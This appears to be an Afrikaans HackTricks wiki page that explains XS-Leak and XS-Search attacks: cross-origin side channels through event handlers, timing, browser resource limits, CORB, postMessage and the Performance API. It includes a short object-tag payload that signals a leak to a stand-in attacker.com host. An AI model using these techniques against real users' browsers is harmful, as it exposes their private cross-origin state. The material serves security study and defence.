# XS-Search/XS-Leaks

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Gebruik [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) om maklik te bou en **werkvloei te outomatiseer** wat aangedryf word deur die w√™reld se **mees gevorderde** gemeenskapstoestelle.\
Kry Toegang Vandag:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kyk na die [**subskripsieplanne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking truuks deur PR's in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basiese Inligting

XS-Search is 'n metode wat gebruik word om **kruis-oorsprong inligting** te **onttrek** deur gebruik te maak van **sy-kanaal kwesbaarhede**.

Belangrike komponente wat betrokke is by hierdie aanval sluit in:

* **Kwetsbare Web**: Die teikenwebwerf waarvan inligting bedoel is om onttrek te word.
* **Aanvaller se Web**: Die kwaadwillige webwerf wat deur die aanvaller geskep is, wat die slagoffer besoek en die ontploffing huisves.
* **Insluitingsmetode**: Die tegniek wat gebruik word om die Kwetsbare Web in die Aanvaller se Web in te sluit (bv. window.open, iframe, fetch, HTML-tag met href, ens.).
* **Lek Tegniek**: Tegnieke wat gebruik word om verskille in die toestand van die Kwetsbare Web te onderskei op grond van inligting wat deur die insluitingsmetode versamel is.
* **Toestande**: Die twee potensi√´le toestande van die Kwetsbare Web, wat die aanvaller poog om te onderskei.
* **Waarneembare Verskille**: Waarneembare variasies waarop die aanvaller staatmaak om die toestand van die Kwetsbare Web af te lei.

### Waarneembare Verskille

Verskeie aspekte kan geanaliseer word om die toestande van die Kwetsbare Web te onderskei:

* **Statuskode**: Onderskeiding tussen **verskeie HTTP-responsstatuskodes** kruis-oorsprong, soos bedienerfoute, kli√´ntfoute, of outentikasiefoute.
* **API Gebruik**: Identifisering van **gebruik van Web API's** oor bladsye, wat onthul of 'n kruis-oorsprong bladsy 'n spesifieke JavaScript Web API gebruik.
* **Herlidings**: Opspoor van navigasies na verskillende bladsye, nie net HTTP-herleidings nie, maar ook di√© wat deur JavaScript of HTML geaktiveer word.
* **Bladsy-inhoud**: Waarneming van **verskille in die HTTP-responsliggaam** of in bladsy sub-hulpbronne, soos die **aantal ingeslote rame** of grootteverskille in beelde.
* **HTTP-kop**: Notering van die teenwoordigheid of moontlik die waarde van 'n **spesifieke HTTP-responskop**, insluitend koppe soos X-Frame-Options, Content-Disposition, en Cross-Origin-Resource-Policy.
* **Tydsberekening**: Opmerking van konsekwente tydverskille tussen die twee toestande.

### Insluitingsmetodes

* **HTML Elemente**: HTML bied verskeie elemente vir **kruis-oorsprong hulpbroninsluiting**, soos stylesheets, beelde, of skripte, wat die blaaiers dwing om 'n nie-HTML hulpbron aan te vra. 'n Samevatting van potensi√´le HTML-elemente vir hierdie doel kan gevind word by [https://github.com/cure53/HTTPLeaks](https://github.com/cure53/HTTPLeaks).
* **Rame**: Elemente soos **iframe**, **object**, en **embed** kan HTML-hulpbronne direk in die aanvaller se bladsy insluit. As die bladsy **gebrek aan raam beskerming** het, kan JavaScript toegang verkry tot die ingeslote hulpbron se venster objek via die contentWindow eienskap.
* **Pop-ups**: Die **`window.open`** metode open 'n hulpbron in 'n nuwe oortjie of venster, wat 'n **vensterhandvatsel** bied vir JavaScript om met metodes en eienskappe te kommunikeer volgens die SOP. Pop-ups, wat dikwels in enkel aanmelding gebruik word, omseil raam en koekie beperkings van 'n teiken hulpbron. Moderne blaaiers beperk egter die skepping van pop-ups tot sekere gebruikersaksies.
* **JavaScript Versoeke**: JavaScript laat direkte versoeke aan teiken hulpbronne toe met behulp van **XMLHttpRequests** of die **Fetch API**. Hierdie metodes bied presiese beheer oor die versoek, soos om te kies om HTTP-herleidings te volg.

### Lek Tegnieke

* **Gebeurtenis Handler**: 'n Klassieke lek tegniek in XS-Leaks, waar gebeurtenis handlers soos **onload** en **onerror** insigte bied oor hulpbronlaai sukses of mislukking.
* **Foutboodskappe**: JavaScript uitsonderings of spesiale foutbladsye kan lek inligting bied, hetsy direk van die foutboodskap of deur die teenwoordigheid en afwesigheid daarvan te onderskei.
* **Globale Beperkings**: Fisiese beperkings van 'n blaier, soos geheue kapasiteit of ander afgedwonge blaier beperkings, kan aandui wanneer 'n drempel bereik is, wat as 'n lek tegniek dien.
* **Globale Toestand**: Waarneembare interaksies met blaier se **globale toestande** (bv. die Geskiedenis koppelvlak) kan uitgebuit word. Byvoorbeeld, die **aantal inskrywings** in 'n blaier se geskiedenis kan leidrade bied oor kruis-oorsprong bladsye.
* **Prestasie API**: Hierdie API bied **prestasie besonderhede van die huidige bladsy**, insluitend netwerk tydsberekening vir die dokument en gelaaide hulpbronne, wat afleidings oor versoekte hulpbronne moontlik maak.
* **Leesbare Eienskappe**: Sommige HTML eienskappe is **leesbaar kruis-oorsprong** en kan as 'n lek tegniek gebruik word. Byvoorbeeld, die `window.frame.length` eienskap laat JavaScript toe om die rame wat in 'n webblad kruis-oorsprong ingesluit is, te tel.

## XSinator Gereedskap & Papier

XSinator is 'n outomatiese hulpmiddel om **blaaiers teen verskeie bekende XS-Leaks** te **kontroleer** soos verduidelik in sy papier: [**https://xsinator.com/paper.pdf**](https://xsinator.com/paper.pdf)

Jy kan **toegang tot die hulpmiddel kry in** [**https://xsinator.com/**](https://xsinator.com/)

{% hint style="warning" %}
**Uitsluit XS-Leaks**: Ons moes XS-Leaks uitsluit wat staatmaak op **dienswerkers** aangesien dit ander lekke in XSinator sou inmeng. Verder het ons besluit om **XS-Leaks wat staatmaak op miskonfigurasie en foute in 'n spesifieke webtoepassing** uit te sluit. Byvoorbeeld, CrossOrigin Resource Sharing (CORS) miskonfigurasies, postMessage lekkasies of Cross-Site Scripting. Daarbenewens het ons tydgebaseerde XS-Leaks uitgesluit aangesien hulle dikwels ly aan stadigheid, geraas en onakkuraatheid.
{% endhint %}

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Gebruik [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) om maklik te bou en **werkvloei te outomatiseer** wat aangedryf word deur die w√™reld se **mees gevorderde** gemeenskapstoestelle.\
Kry Toegang Vandag:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## **Tydgebaseerde tegnieke**

Sommige van die volgende tegnieke gaan tyd gebruik as deel van die proses om verskille in die moontlike toestande van die webbladsye op te spoor. Daar is verskillende maniere om tyd in 'n webblaaier te meet.

**Klokke**: Die [performance.now()](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now) API laat ontwikkelaars toe om ho√´-resolusie tydsmetings te verkry.\
Daar is 'n aansienlike aantal API's wat aanvallers kan misbruik om implisiete klokke te skep: [Broadcast Channel API](https://developer.mozilla.org/en-US/docs/Web/API/Broadcast\_Channel\_API), [Message Channel API](https://developer.mozilla.org/en-US/docs/Web/API/MessageChannel), [requestAnimationFrame](https://developer.mozilla.org/en-US/docs/Web/API/window/requestAnimationFrame), [setTimeout](https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setTimeout), CSS animasies, en ander.\
Vir meer inligting: [https://xsleaks.dev/docs/attacks/timing-attacks/clocks](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/).

## Gebeurtenis Handler Tegnieke

### Onload/Onerror

* **Insluitingsmetodes**: Rame, HTML Elemente
* **Waarneembare Verskil**: Statuskode
* **Meer inligting**: [https://www.usenix.org/conference/usenixsecurity19/presentation/staicu](https://www.usenix.org/conference/usenixsecurity19/presentation/staicu), [https://xsleaks.dev/docs/attacks/error-events/](https://xsleaks.dev/docs/attacks/error-events/)
* **Opsomming**: as 'n poging aangewend word om 'n hulpbron te laai, word onerror/onload gebeurtenisse geaktiveer wanneer die hulpbron suksesvol/misluk laai, dit is moontlik om die statuskode uit te vind.
* **Kode voorbeeld**: [https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)](https://xsinator.com/testing.html#Event%20Handler%20Leak%20\(Script\))

{% content-ref url="xs-search/cookie-bomb-+-onerror-xs-leak.md" %}
[cookie-bomb-+-onerror-xs-leak.md](xs-search/cookie-bomb-+-onerror-xs-leak.md)
{% endcontent-ref %}

Die kode voorbeeld probeer om **scripts objek te laai van JS**, maar **ander tags** soos objek, stylesheets, beelde, klank kan ook gebruik word. Boonop is dit ook moontlik om die **tag direk** in te voeg en die `onload` en `onerror` gebeurtenisse binne die tag te verklaar (in plaas van om dit van JS in te voeg).

Daar is ook 'n skrip-vrye weergawe van hierdie aanval:
```html
<object data="//example.com/404">
<object data="//attacker.com/?error"></object>
</object>
```
In hierdie geval, as `example.com/404` nie gevind word nie, sal `attacker.com/?error` gelaai word.

### Onload Timing

* **Insluitingsmetodes**: HTML Elemente
* **Waarneembare Verskil**: Tyd (generaal weens Bladsy Inhoud, Statuskode)
* **Meer inligting**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events)
* **Opsomming:** Die [**performance.now()**](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) **API** kan gebruik word om te meet hoe lank dit neem om 'n versoek uit te voer. Ander horlosies kan egter gebruik word, soos die [**PerformanceLongTaskTiming API**](https://developer.mozilla.org/en-US/docs/Web/API/PerformanceLongTaskTiming) wat take kan identifiseer wat langer as 50ms duur.
* **Kode Voorbeeld**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events) 'n ander voorbeeld in:

{% content-ref url="xs-search/performance.now-example.md" %}
[performance.now-example.md](xs-search/performance.now-example.md)
{% endcontent-ref %}

#### Onload Timing + Gedwonge Zware Taak

Hierdie tegniek is net soos die vorige een, maar die **aanvaller** sal ook **dwing** dat 'n aksie 'n **relevante hoeveelheid tyd** neem wanneer die **antwoord positief of negatief is** en daardie tyd meet.

{% content-ref url="xs-search/performance.now-+-force-heavy-task.md" %}
[performance.now-+-force-heavy-task.md](xs-search/performance.now-+-force-heavy-task.md)
{% endcontent-ref %}

### unload/beforeunload Timing

* **Insluitingsmetodes**: Raamwerke
* **Waarneembare Verskil**: Tyd (generaal weens Bladsy Inhoud, Statuskode)
* **Meer inligting**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)
* **Opsomming:** Die [SharedArrayBuffer horlosie](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#sharedarraybuffer-and-web-workers) kan gebruik word om te meet hoe lank dit neem om 'n versoek uit te voer. Ander horlosies kan gebruik word.
* **Kode Voorbeeld**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)

Die tyd wat geneem word om 'n hulpbron te verkry, kan gemeet word deur die [`unload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/unload\_event) en [`beforeunload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/beforeunload\_event) gebeurtenisse te benut. Die **`beforeunload`** gebeurtenis word geaktiveer wanneer die blaaier op die punt is om na 'n nuwe bladsy te navigeer, terwyl die **`unload`** gebeurtenis plaasvind wanneer die navigasie werklik plaasvind. Die tydverskil tussen hierdie twee gebeurtenisse kan bereken word om die **duur wat die blaaiers spandeer het om die hulpbron te verkry** te bepaal.

### Sandboxed Frame Timing + onload <a href="#sandboxed-frame-timing-attacks" id="sandboxed-frame-timing-attacks"></a>

* **Insluitingsmetodes**: Raamwerke
* **Waarneembare Verskil**: Tyd (generaal weens Bladsy Inhoud, Statuskode)
* **Meer inligting**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)
* **Opsomming:** Die [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) API kan gebruik word om te meet hoe lank dit neem om 'n versoek uit te voer. Ander horlosies kan gebruik word.
* **Kode Voorbeeld**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)

Daar is waargeneem dat in die afwesigheid van [Framing Beskermings](https://xsleaks.dev/docs/defenses/opt-in/xfo/), die tyd wat benodig word vir 'n bladsy en sy subhulpbronne om oor die netwerk te laai, deur 'n aanvaller gemeet kan word. Hierdie meting is tipies moontlik omdat die `onload` handler van 'n iframe slegs geaktiveer word na die voltooiing van hulpbronlaai en JavaScript-uitvoering. Om die variabiliteit wat deur skripuitvoering ingebring word, te omseil, kan 'n aanvaller die [`sandbox`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe) attribuut binne die `<iframe>` gebruik. Die insluiting van hierdie attribuut beperk verskeie funksies, veral die uitvoering van JavaScript, wat 'n meting fasiliteer wat hoofsaaklik deur netwerkprestasie be√Ønvloed word.
```javascript
// Example of an iframe with the sandbox attribute
<iframe src="example.html" sandbox></iframe>
```
### #ID + error + onload

* **Inclusion Methods**: Frames
* **Detectable Difference**: Bladsy Inhoud
* **More info**:
* **Summary**: As jy die bladsy kan laat fout wanneer die korrekte inhoud toeganklik is en dit korrek kan laai wanneer enige inhoud toeganklik is, kan jy 'n lus maak om al die inligting te onttrek sonder om die tyd te meet.
* **Code Example**:

Neem aan dat jy die **bladsy** wat die **geheime** inhoud het, **binne 'n Iframe** kan **invoeg**.

Jy kan die **slagoffer laat soek** na die l√™er wat "_**vlag**_" bevat deur 'n **Iframe** te gebruik (byvoorbeeld 'n CSRF te benut). Binne die Iframe weet jy dat die _**onload gebeurtenis**_ altyd **ten minste een keer** sal **uitgevoer word**. Dan kan jy die **URL** van die **iframe** verander, maar net die **inhoud** van die **hash** binne die URL verander.

Byvoorbeeld:

1. **URL1**: www.attacker.com/xssearch#try1
2. **URL2**: www.attacker.com/xssearch#try2

As die eerste URL **suksesvol gelaai** is, dan, wanneer die **hash** deel van die URL **verander** word, sal die **onload** gebeurtenis **nie weer geaktiveer** word nie. Maar **as** die bladsy 'n soort **fout** gehad het tydens **laai**, dan sal die **onload** gebeurtenis **weer geaktiveer** word.

Dan kan jy **onderskei tussen** 'n **korrek** gelaaide bladsy of 'n bladsy wat 'n **fout** het wanneer dit toeganklik is.

### Javascript Execution

* **Inclusion Methods**: Frames
* **Detectable Difference**: Bladsy Inhoud
* **More info**:
* **Summary:** As die **bladsy** die **sensitiewe** inhoud **teruggee**, **of** 'n **inhoud** wat deur die gebruiker **beheer** kan word. Die gebruiker kan **geldige JS kode in die negatiewe geval** stel, en **laai** elke poging binne **`<script>`** etikette, so in **negatiewe** gevalle sal die aanvallers **kode** **uitgevoer** word, en in **bevestigende** gevalle sal **niks** uitgevoer word nie.
* **Code Example:**

{% content-ref url="xs-search/javascript-execution-xs-leak.md" %}
[javascript-execution-xs-leak.md](xs-search/javascript-execution-xs-leak.md)
{% endcontent-ref %}

### CORB - Onerror

* **Inclusion Methods**: HTML Elemente
* **Detectable Difference**: Statuskode & Headers
* **More info**: [https://xsleaks.dev/docs/attacks/browser-features/corb/](https://xsleaks.dev/docs/attacks/browser-features/corb/)
* **Summary**: **Cross-Origin Read Blocking (CORB)** is 'n sekuriteitsmaatre√´l wat webblaaie verhinder om sekere sensitiewe kruis-oorsprong hulpbronne te laai om teen aanvalle soos **Spectre** te beskerm. Tog kan aanvallers sy beskermende gedrag benut. Wanneer 'n antwoord wat aan **CORB** onderwerp is, 'n _**CORB beskermde**_ `Content-Type` met `nosniff` en 'n `2xx` statuskode teruggee, verwyder **CORB** die liggaam en headers van die antwoord. Aanvallers wat dit waarneem kan die kombinasie van die **statuskode** (wat sukses of fout aandui) en die `Content-Type` (wat aandui of dit deur **CORB** beskerm word), aflei, wat kan lei tot potensi√´le inligtingslek.
* **Code Example**:

Kyk na die meer inligting skakel vir meer inligting oor die aanval.

### onblur

* **Inclusion Methods**: Frames
* **Detectable Difference**: Bladsy Inhoud
* **More info**: [https://xsleaks.dev/docs/attacks/id-attribute/](https://xsleaks.dev/docs/attacks/id-attribute/), [https://xsleaks.dev/docs/attacks/experiments/portals/](https://xsleaks.dev/docs/attacks/experiments/portals/)
* **Summary**: Lek sensitiewe data van die id of naam attribuut.
* **Code Example**: [https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet](https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet)

Dit is moontlik om 'n **bladsy** binne 'n **iframe** te **laai** en die **`#id_value`** te gebruik om die bladsy te **fokus op die element** van die iframe met die aangeduide id, dan, as 'n **`onblur`** sein geaktiveer word, bestaan die ID element.\
Jy kan dieselfde aanval met **`portal`** etikette uitvoer.

### postMessage Broadcasts <a href="#postmessage-broadcasts" id="postmessage-broadcasts"></a>

* **Inclusion Methods**: Frames, Pop-ups
* **Detectable Difference**: API Gebruik
* **More info**: [https://xsleaks.dev/docs/attacks/postmessage-broadcasts/](https://xsleaks.dev/docs/attacks/postmessage-broadcasts/)
* **Summary**: Versamel sensitiewe inligting van 'n postMessage of gebruik die teenwoordigheid van postMessages as 'n orakel om die status van die gebruiker op die bladsy te ken.
* **Code Example**: `Enige kode wat na alle postMessages luister.`

Toepassings gebruik gereeld [`postMessage` uitsaai](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage) om oor verskillende oorspronge te kommunikeer. Tog kan hierdie metode per ongeluk **sensitiewe inligting** blootstel as die `targetOrigin` parameter nie behoorlik gespesifiseer is nie, wat enige venster toelaat om die boodskappe te ontvang. Verder kan die blote daad van die ontvangs van 'n boodskap as 'n **orakel** optree; byvoorbeeld, sekere boodskappe mag slegs aan gebruikers wat ingelog is, gestuur word. Daarom kan die teenwoordigheid of afwesigheid van hierdie boodskappe inligting oor die gebruiker se toestand of identiteit onthul, soos of hulle geverifieer is of nie.

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Gebruik [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) om maklik te bou en **werkvloei** te outomatiseer wat deur die w√™reld se **mees gevorderde** gemeenskap gereedskap aangedryf word.\
Kry Toegang Vandag:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Global Limits Techniques

### WebSocket API

* **Inclusion Methods**: Frames, Pop-ups
* **Detectable Difference**: API Gebruik
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **Summary**: Die uitputting van die WebSocket verbinding limiet lek die aantal WebSocket verbindings van 'n kruis-oorsprong bladsy.
* **Code Example**: [https://xsinator.com/testing.html#WebSocket%20Leak%20(FF)](https://xsinator.com/testing.html#WebSocket%20Leak%20\(FF\)), [https://xsinator.com/testing.html#WebSocket%20Leak%20(GC)](https://xsinator.com/testing.html#WebSocket%20Leak%20\(GC\))

Dit is moontlik om te identifiseer of, en hoeveel, **WebSocket verbindings 'n teikenbladsy gebruik**. Dit stel 'n aanvaller in staat om toepassingsstate te detecteer en inligting wat aan die aantal WebSocket verbindings gekoppel is, te lek.

As een **oorsprong** die **maksimum aantal WebSocket** verbindingsobjekte gebruik, ongeag hul verbindingsstaat, sal die skepping van **nuwe objektes 'n JavaScript uitsondering** tot gevolg h√™. Om hierdie aanval uit te voer, open die aanvaller se webwerf die teikenwebwerf in 'n pop-up of iframe en dan, nadat die teikenweb gelaai is, probeer om die maksimum aantal WebSockets verbindings moontlik te skep. Die **aantal gegooi uitsonderings** is die **aantal WebSocket verbindings wat deur die teikenwebwerf** venster gebruik word.

### Payment API

* **Inclusion Methods**: Frames, Pop-ups
* **Detectable Difference**: API Gebruik
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **Summary**: Detect Payment Request omdat slegs een aktief kan wees op 'n slag.
* **Code Example**: [https://xsinator.com/testing.html#Payment%20API%20Leak](https://xsinator.com/testing.html#Payment%20API%20Leak)

Hierdie XS-Lek stel 'n aanvaller in staat om **te detecteer wanneer 'n kruis-oorsprong bladsy 'n betalingsversoek inisieer**.

Omdat **slegs een betalingsversoek aktief kan wees** op dieselfde tyd, as die teikenwebwerf die Payment Request API gebruik, sal enige verdere pogings om hierdie API te gebruik, misluk, en 'n **JavaScript uitsondering** veroorsaak. Die aanvaller kan dit benut deur **periodiek te probeer om die Payment API UI te wys**. As een poging 'n uitsondering veroorsaak, gebruik die teikenwebwerf dit tans. Die aanvaller kan hierdie periodieke pogings verberg deur die UI onmiddellik na skepping te sluit.

### Timing the Event Loop <a href="#timing-the-event-loop" id="timing-the-event-loop"></a>

* **Inclusion Methods**:
* **Detectable Difference**: Tydsduur (generaal as gevolg van Bladsy Inhoud, Statuskode)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop)
* **Summary:** Meet die uitvoerings tyd van 'n web wat die enkel-draad JS gebeurtenislus misbruik.
* **Code Example**:

{% content-ref url="xs-search/event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](xs-search/event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

JavaScript werk op 'n [enkel-draad gebeurtenislus](https://developer.mozilla.org/en-US/docs/Web/JavaScript/EventLoop) mededinging model, wat beteken dat **dit kan slegs een taak op 'n slag uitvoer**. Hierdie eienskap kan benut word om te meet **hoe lank kode van 'n ander oorsprong neem om uit te voer**. 'n Aanvaller kan die uitvoerings tyd van hul eie kode in die gebeurtenislus meet deur voortdurend gebeurtenisse met vaste eienskappe te stuur. Hierdie gebeurtenisse sal verwerk word wanneer die gebeurtenispoel leeg is. As ander oorspronge ook gebeurtenisse na dieselfde poel stuur, kan 'n **aanvaller die tyd aflei wat dit neem vir hierdie eksterne gebeurtenisse om uit te voer deur die vertragings in die uitvoering van hul eie take te observeer**. Hierdie metode van die monitering van die gebeurtenislus vir vertragings kan die uitvoerings tyd van kode van verskillende oorspronge onthul, wat moontlik sensitiewe inligting blootstel.

{% hint style="warning" %}
In 'n uitvoerings tydsberekening is dit moontlik om **netwerk faktore** te **elimineer** om **meer presiese metings** te verkry. Byvoorbeeld, deur die hulpbronne wat deur die bladsy gebruik word, te laai voordat dit gelaai word.
{% endhint %}

### Busy Event Loop <a href="#busy-event-loop" id="busy-event-loop"></a>

* **Inclusion Methods**:
* **Detectable Difference**: Tydsduur (generaal as gevolg van Bladsy Inhoud, Statuskode)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop)
* **Summary:** Een metode om die uitvoerings tyd van 'n web operasie te meet, behels die doelbewuste blokkering van die gebeurtenislus van 'n draad en dan die tydsduur **hoe lank dit neem voordat die gebeurtenislus weer beskikbaar is**. Deur 'n blokkerende operasie (soos 'n lang berekening of 'n sinchroniese API oproep) in die gebeurtenislus in te voeg, en die tyd te monitor wat dit neem voordat daaropvolgende kode begin uitvoer, kan 'n mens die duur van die take wat in die gebeurtenislus tydens die blokkeringsperiode uitgevoer is, aflei. Hierdie tegniek benut die enkel-draad aard van JavaScript se gebeurtenislus, waar take sekwensieel uitgevoer word, en kan insigte bied in die prestasie of gedrag van ander operasies wat dieselfde draad deel.
* **Code Example**:

'n Beduidende voordeel van die tegniek om uitvoerings tyd te meet deur die gebeurtenislus te sluit, is die potensiaal om **Site Isolasie** te omseil. **Site Isolasie** is 'n sekuriteitskenmerk wat verskillende webwerwe in aparte prosesse skei, met die doel om te voorkom dat kwaadwillige webwerwe direk toegang tot sensitiewe data van ander webwerwe verkry. Tog, deur die uitvoerings tyd van 'n ander oorsprong te be√Ønvloed deur die gedeelde gebeurtenislus, kan 'n aanvaller indirek inligting oor daardie oorsprong se aktiwiteite onttrek. Hierdie metode staat nie op direkte toegang tot die ander oorsprong se data nie, maar eerder op die waarneming van die impak van daardie oorsprong se aktiwiteite op die gedeelde gebeurtenislus, en so die beskermende hindernisse wat deur **Site Isolasie** gevestig is, ontduik.

{% hint style="warning" %}
In 'n uitvoerings tydsberekening is dit moontlik om **netwerk faktore** te **elimineer** om **meer presiese metings** te verkry. Byvoorbeeld, deur die hulpbronne wat deur die bladsy gebruik word, te laai voordat dit gelaai word.
{% endhint %}

### Connection Pool

* **Inclusion Methods**: JavaScript Versoeke
* **Detectable Difference**: Tydsduur (generaal as gevolg van Bladsy Inhoud, Statuskode)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)
* **Summary:** 'n Aanvaller kan al die sokke sluit behalwe 1, die teiken web laai en terselfdertyd 'n ander bladsy laai, die tyd totdat die laaste bladsy begin laai is die tyd wat die teiken bladsy geneem het om te laai.
* **Code Example**:

{% content-ref url="xs-search/connection-pool-example.md" %}
[connection-pool-example.md](xs-search/connection-pool-example.md)
{% endcontent-ref %}

Blaaiers gebruik sokke vir bediener kommunikasie, maar as gevolg van die beperkte hulpbronne van die bedryfstelsel en hardeware, **is blaaiers gedwing om 'n limiet op te l√™** op die aantal gelyktydige sokke. Aanvallers kan hierdie beperking benut deur die volgende stappe:

1. Bepaal die blaaiers sokke limiet, byvoorbeeld, 256 globale sokke.
2. Beset 255 sokke vir 'n lang tyd deur 255 versoeke na verskillende gasheers te begin, ontwerp om die verbindings oop te hou sonder om te voltooi.
3. Gebruik die 256ste sok om 'n versoek na die teikenbladsy te stuur.
4. Probeer 'n 257ste versoek na 'n ander gasheer. Aangesien al die sokke in gebruik is (soos per stappe 2 en 3), sal hierdie versoek in die waglys geplaas word totdat 'n sok beskikbaar word. Die vertraging voordat hierdie versoek voortgaan, bied die aanvaller tyds-inligting oor die netwerkaktiwiteit wat met die 256ste sok (die teikenbladsy se sok) verband hou. Hierdie afleiding is moontlik omdat die 255 sokke van stap 2 steeds betrokke is, wat impliseer dat enige nuut beskikbare sok die een moet wees wat van stap 3 vrygestel is. Die tyd wat die 256ste sok neem om beskikbaar te word, is dus direk gekoppel aan die tyd wat benodig word vir die versoek na die teikenbladsy om te voltooi.

Vir meer inligting: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)

### Connection Pool by Destination

* **Inclusion Methods**: JavaScript Versoeke
* **Detectable Difference**: Tydsduur (generaal as gevolg van Bladsy Inhoud, Statuskode)
* **More info**:
* **Summary:** Dit is soos die vorige tegniek, maar in plaas daarvan om al die sokke te gebruik, stel Google **Chrome** 'n limiet van **6 gelyktydige versoeke na die dieselfde oorsprong**. As ons **5 blokkeer** en dan 'n 6de versoek **afskiet**, kan ons dit **tyd** en as ons daarin slaag om die **slagoffer bladsy te laat stuur** meer **versoeke** na dieselfde eindpunt om 'n **status** van die **bladsy** te detecteer, sal die **6de versoek** **langer** neem en kan ons dit detecteer.

## Performance API Techniques

Die [`Performance API`](https://developer.mozilla.org/en-US/docs/Web/API/Performance) bied insigte in die prestasiemetrieke van webtoepassings, verder verryk deur die [`Resource Timing API`](https://developer.mozilla.org/en-US/docs/Web/API/Resource\_Timing\_API). Die Resource Timing API stel die monitering van gedetailleerde netwerk versoek tydsduur moontlik, soos die duur van die versoeke. Opmerklik is dat wanneer bedieners die `Timing-Allow-Origin: *` header in hul antwoorde insluit, addisionele data soos die oordraggrootte en domein soek tyd beskikbaar word.

Hierdie rykdom van data kan verkry word via metodes soos [`performance.getEntries`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntries) of [`performance.getEntriesByName`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntriesByName), wat 'n omvattende oorsig van prestasie-verwante inligting bied. Boonop fasiliteer die API die meting van uitvoerings tye deur die verskil tussen tydstempels wat verkry is van [`performance.now()`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now) te bereken. Dit is egter die moeite werd om op te let dat vir sekere operasies in blaaiers soos Chrome, die presisie van `performance.now()` moontlik beperk kan wees tot millisekondes, wat die granulariteit van tydsmetings kan be√Ønvloed.

